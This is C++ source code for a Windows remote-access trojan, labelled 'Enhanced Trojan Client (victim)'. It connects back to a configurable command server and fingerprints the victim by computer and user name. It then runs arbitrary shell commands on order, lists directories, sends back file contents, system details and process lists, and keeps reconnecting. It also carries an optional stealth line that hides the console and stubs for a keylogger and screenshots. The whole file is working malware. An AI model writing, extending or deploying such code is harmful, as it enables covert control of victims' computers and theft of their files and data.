// client.cpp - Enhanced Trojan Client (victim)
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <ctime>
#include <tlhelp32.h>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 10000
#define SERVER_IP "127.0.0.1"  // Change this to the actual server IP
#define BUFFER_SIZE 4096

// Command types for better organization
enum CommandType {
    CMD_SHELL,           // Execute shell command
    CMD_SCREENSHOT,      // Take screenshot (placeholder)
    CMD_FILE_LIST,       // List files in directory
    CMD_FILE_GET,        // Get file content
    CMD_SYSTEM_INFO,     // Get system information
    CMD_PROCESS_LIST,    // List running processes
    CMD_KEYLOG_START,    // Start keylogger (placeholder)
    CMD_KEYLOG_STOP,     // Stop keylogger (placeholder)
    CMD_PING,            // Simple ping/keep-alive
    CMD_UNKNOWN          // Unknown command
};

// Function prototypes
bool InitializeWinsock();
bool ConnectToServer(SOCKET& clientSocket, const char* serverIP);
void CommunicateWithServer(SOCKET clientSocket);
void CleanupWinsock(SOCKET clientSocket);
CommandType ParseCommand(const std::string& command);
std::string ExecuteShellCommand(const std::string& command);
std::string ListFilesInDirectory(const std::string& directory);
std::string GetFileContent(const std::string& filename);
std::string GetSystemInfo();
std::string ListRunningProcesses();
bool SendResponse(SOCKET clientSocket, const std::string& response);
void LogActivity(const std::string& activity);

// Global variables
bool isRunning = true;
std::string clientId;

// Initialize Winsock
bool InitializeWinsock() {
    WSADATA wsaData;
    WORD wVersionRequested = MAKEWORD(2, 2);
    int result = WSAStartup(wVersionRequested, &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return false;
    }
    return true;
}

// Connect to server
bool ConnectToServer(SOCKET& clientSocket, const char* serverIP) {
    struct sockaddr_in serverAddr;
    
    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        printf("Error creating socket: %d\n", WSAGetLastError());
        WSACleanup();
        return false;
    }
    
    // Set up server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP);
    
    // Connect to server
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Connect failed: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }
    
    return true;
}

// Generate a unique client ID
std::string GenerateClientId() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    char username[256];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);
    
    std::stringstream ss;
    ss << computerName << "_" << username << "_" << time(NULL);
    return ss.str();
}

// Parse command to determine type
CommandType ParseCommand(const std::string& command) {
    if (command.substr(0, 5) == "SHELL") {
        return CMD_SHELL;
    } else if (command.substr(0, 10) == "SCREENSHOT") {
        return CMD_SCREENSHOT;
    } else if (command.substr(0, 4) == "LIST") {
        return CMD_FILE_LIST;
    } else if (command.substr(0, 7) == "GETFILE") {
        return CMD_FILE_GET;
    } else if (command.substr(0, 7) == "SYSINFO") {
        return CMD_SYSTEM_INFO;
    } else if (command.substr(0, 8) == "PROCLIST") {
        return CMD_PROCESS_LIST;
    } else if (command.substr(0, 11) == "KEYLOG_START") {
        return CMD_KEYLOG_START;
    } else if (command.substr(0, 10) == "KEYLOG_STOP") {
        return CMD_KEYLOG_STOP;
    } else if (command == "PING") {
        return CMD_PING;
    } else {
        return CMD_UNKNOWN;
    }
}

// Execute a shell command and return output
std::string ExecuteShellCommand(const std::string& command) {
    std::string cmd = command.substr(6); // Remove "SHELL " prefix
    
    // Create pipes for reading output
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    
    if (!pipe) {
        return "Error executing command";
    }
    
    // Read command output
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }
    
    _pclose(pipe);
    return result;
}

// List files in a directory
std::string ListFilesInDirectory(const std::string& directoryParam) {
    std::string directory;
    
    // Parse directory from command
    if (directoryParam.length() > 5) { // "LIST "
        directory = directoryParam.substr(5);
    } else {
        directory = "."; // Current directory
    }
    
    // Handle directory listing
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    std::string result = "Files in directory " + directory + ":\n";
    std::string searchPath = directory + "\\*";
    
    hFind = FindFirstFileA(searchPath.c_str(), &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        return "Error listing directory: " + directory;
    }
    
    do {
        std::string filename = findData.cFileName;
        std::string fileInfo = filename;
        
        // Add directory indicator
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            fileInfo += " <DIR>";
        } else {
            // Add file size
            fileInfo += " (" + std::to_string(findData.nFileSizeLow) + " bytes)";
        }
        
        result += fileInfo + "\n";
    } while (FindNextFileA(hFind, &findData));
    
    FindClose(hFind);
    return result;
}

// Get file content
std::string GetFileContent(const std::string& filenameParam) {
    std::string filename;
    
    // Parse filename from command
    if (filenameParam.length() > 8) { // "GETFILE "
        filename = filenameParam.substr(8);
    } else {
        return "No filename specified";
    }
    
    // Read file
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        return "Error: Could not open file " + filename;
    }
    
    std::stringstream buffer;
    buffer << file.rdbuf();
    
    return "===FILE BEGIN: " + filename + "===\n" + buffer.str() + "\n===FILE END===";
}

// Get system information
std::string GetSystemInfo() {
    std::stringstream ss;
    SYSTEM_INFO sysInfo;
    ::GetSystemInfo(&sysInfo);
    
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    
    ss << "===SYSTEM INFORMATION===\n";
    
    // Computer name and username
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    char username[256];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);
    
    ss << "Computer name: " << computerName << "\n";
    ss << "Username: " << username << "\n";
    
    // OS version
    OSVERSIONINFOA osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    
    // Note: GetVersionEx is deprecated, but still works for basic info
    #pragma warning(disable:4996)
    GetVersionExA(&osInfo);
    #pragma warning(default:4996)
    
    ss << "OS Version: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion << "\n";
    
    // Processor info
    ss << "Processor: " << sysInfo.dwNumberOfProcessors << " processors\n";
    
    // Memory info
    ss << "Total physical memory: " << memStatus.ullTotalPhys / (1024*1024) << " MB\n";
    ss << "Available physical memory: " << memStatus.ullAvailPhys / (1024*1024) << " MB\n";
    
    return ss.str();
}

// List running processes
std::string ListRunningProcesses() {
    std::stringstream ss;
    ss << "===RUNNING PROCESSES===\n";
    
    // Take a snapshot of all processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return "Error: Unable to create process snapshot";
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // Retrieve information about the first process
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return "Error: Failed to get process information";
    }
    
    // Walk through the snapshot of processes
    do {
        ss << "Process ID: " << pe32.th32ProcessID << "\tName: " << pe32.szExeFile << "\n";
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
    return ss.str();
}

// Log activity for debugging
void LogActivity(const std::string& activity) {
    std::ofstream logFile("client_log.txt", std::ios::app);
    if (logFile.is_open()) {
        time_t now = time(0);
        char* dt = ctime(&now);
        logFile << dt << ": " << activity << std::endl;
        logFile.close();
    }
}

// Send response back to server
bool SendResponse(SOCKET clientSocket, const std::string& response) {
    if (send(clientSocket, response.c_str(), response.length(), 0) == SOCKET_ERROR) {
        printf("Send failed: %d\n", WSAGetLastError());
        return false;
    }
    return true;
}

// Thread function to receive commands from server
DWORD WINAPI ReceiveCommands(LPVOID lpParam) {
    SOCKET clientSocket = *(SOCKET*)lpParam;
    char buffer[BUFFER_SIZE];
    int bytesReceived;
    
    while (isRunning) {
        // Receive data from server
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        
        if (bytesReceived <= 0) {
            // Server disconnected or error occurred
            printf("Server disconnected\n");
            isRunning = false;
            break;
        }
        
        // Null terminate the received data
        buffer[bytesReceived] = '\0';
        
        // Process the received command
        std::string command(buffer);
        printf("Received command: %s\n", command.c_str());
        LogActivity("Received command: " + command);
        
        // Parse the command and execute appropriate function
        std::string response;
        CommandType cmdType = ParseCommand(command);
        
        switch (cmdType) {
            case CMD_SHELL:
                response = ExecuteShellCommand(command);
                break;
                
            case CMD_SCREENSHOT:
                response = "Screenshot functionality not implemented yet";
                break;
                
            case CMD_FILE_LIST:
                response = ListFilesInDirectory(command);
                break;
                
            case CMD_FILE_GET:
                response = GetFileContent(command);
                break;
                
            case CMD_SYSTEM_INFO:
                response = GetSystemInfo();
                break;
                
            case CMD_PROCESS_LIST:
                response = ListRunningProcesses();
                break;
                
            case CMD_KEYLOG_START:
                response = "Keylogger start functionality not implemented yet";
                break;
                
            case CMD_KEYLOG_STOP:
                response = "Keylogger stop functionality not implemented yet";
                break;
                
            case CMD_PING:
                response = "PONG from " + clientId;
                break;
                
            case CMD_UNKNOWN:
            default:
                response = "Unknown command: " + command;
                break;
        }
        
        // Send response back to server
        if (!SendResponse(clientSocket, response)) {
            isRunning = false;
            break;
        }
        
        LogActivity("Sent response for command: " + command);
    }
    
    return 0;
}


// Communicate with server
void CommunicateWithServer(SOCKET clientSocket) {
    // Generate client ID
    clientId = GenerateClientId();
    
    // Send initial identification
    std::string initialMsg = "CLIENT_CONNECT:" + clientId;
    if (!SendResponse(clientSocket, initialMsg)) {
        printf("Failed to send initial connection message\n");
        isRunning = false;
        return;
    }
    
    LogActivity("Connected with ID: " + clientId);
    
    // Create thread to receive commands from server
    HANDLE hThread = CreateThread(NULL, 0, ReceiveCommands, &clientSocket, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create receive thread\n");
        isRunning = false;
        return;
    }
    
    // Main loop for status updates and keeping connection alive
    int heartbeatInterval = 60; // in seconds
    while (isRunning) {
        // Send heartbeat every heartbeatInterval seconds
        if (!SendResponse(clientSocket, "HEARTBEAT:" + clientId)) {
            printf("Failed to send heartbeat, connection may be lost\n");
            isRunning = false;
            break;
        }
        
        LogActivity("Sent heartbeat");
        
        // Sleep for heartbeatInterval seconds, but check isRunning every second
        for (int i = 0; i < heartbeatInterval && isRunning; i++) {
            Sleep(1000);
        }
    }
    
    // Wait for receive thread to finish
    WaitForSingleObject(hThread, 5000); // Wait up to 5 seconds
    CloseHandle(hThread);
    
    printf("Communication ended\n");
}

// Cleanup Winsock
void CleanupWinsock(SOCKET clientSocket) {
    closesocket(clientSocket);
    WSACleanup();
}

// Attempt to connect to server with retry mechanism
bool ConnectWithRetry(SOCKET& clientSocket) {
    int retryCount = 0;
    const int maxRetries = 10;  // Maksymalna liczba prób połączenia
    const int initialDelay = 5000;  // 5 sekund początkowego opóźnienia
    int currentDelay = initialDelay;
    
    while (retryCount < maxRetries) {
        printf("Attempting to connect to server (attempt %d/%d)...\n", retryCount + 1, maxRetries);
        
        if (ConnectToServer(clientSocket, SERVER_IP)) {
            printf("Connected to server successfully\n");
            return true;
        }
        
        printf("Connection failed. Retrying in %d seconds...\n", currentDelay / 1000);
        Sleep(currentDelay);  // Czekaj przed ponowną próbą
        
        // Zwiększ opóźnienie dla następnej próby (maksymalnie 30 sekund)
        currentDelay = std::min(currentDelay * 2, 30000);
        retryCount++;
    }
    
    printf("Failed to connect after %d attempts. Will try again in 60 seconds.\n", maxRetries);
    Sleep(60000);  // Dłuższa przerwa po wyczerpaniu prób
    return false;
}

// Main function
int main() {
    // Hide console window for stealth operation
    // Uncomment this for stealth mode
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    SOCKET clientSocket;
    
    // Initialize Winsock
    if (!InitializeWinsock()) {
        return 1;
    }
    
    // Main connection loop
    while (true) {
        // Reset connection status
        isRunning = false;
        
        // Try to connect to server
        if (ConnectWithRetry(clientSocket)) {
            // Set running flag after successful connection
            isRunning = true;
            
            // Communicate with server while connection is active
            CommunicateWithServer(clientSocket);
            
            // Clean up socket after communication ends
            closesocket(clientSocket);
        }
        
        printf("Connection lost. Waiting before reconnect attempt...\n");
        Sleep(10000);  // Wait 10 seconds before starting reconnection process
    }
    
    // Cleanup
    CleanupWinsock(clientSocket);
    
    return 0;
}